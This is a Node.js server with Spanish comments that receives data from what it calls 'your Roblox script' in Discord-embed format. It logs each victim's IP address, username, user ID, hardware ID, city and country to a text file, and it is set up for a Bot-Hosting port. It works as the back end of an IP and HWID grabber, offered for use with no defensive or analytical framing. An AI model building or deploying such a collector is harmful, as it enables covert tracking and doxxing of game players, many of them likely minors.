const http = require('http');
const fs = require('fs');

const server = http.createServer((req, res) => {
    // Cabeceras CORS por compatibilidad
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.writeHead(204);
        res.end();
        return;
    }

    // Acepta la ruta raíz o /api/log para mayor flexibilidad
    if (req.method === 'POST') {
        let body = '';
        
        req.on('data', chunk => {
            body += chunk.toString();
        });

        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const timestamp = new Date().toISOString();
                
                let logDetails = "";

                // Si viene en el formato de Discord Embeds de tu script de Roblox
                if (data.embeds && data.embeds[0] && data.embeds[0].fields) {
                    const fields = data.embeds[0].fields;
                    let info = {};
                    
                    fields.forEach(field => {
                        info[field.name] = field.value;
                    });

                    logDetails = `[${timestamp}] IP: ${info["IP Address"] || 'N/A'} | User: ${info["Username"] || 'N/A'} (ID: ${info["User ID"] || 'N/A'}) | HWID: ${info["HWID"] || 'N/A'} | Ubicación: ${info["City"] || 'N/A'}, ${info["Country"] || 'N/A'}`;
                } else {
                    // Si viene en formato plano tradicional
                    logDetails = `[${timestamp}] Datos recibidos: ${JSON.stringify(data)}`;
                }
                
                console.log("Nuevo registro procesado:", logDetails);

                fs.appendFile('logs.txt', logDetails + '\n', err => {
                    if (err) console.error("Error al guardar en el archivo:", err);
                });

                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: "success", message: "Guardado en la nube" }));
            } catch (e) {
                console.error("Error al parsear JSON:", e);
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: "error", message: "JSON inválido" }));
            }
        });
    } else {
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end("Ruta no encontrada");
    }
});
// Forzar el puerto exacto que te asignó Bot-Hosting
const PORT = process.env.PORT || 26237;

server.listen(PORT, () => {
    console.log(`Servidor activo en el puerto ${PORT}`);
});
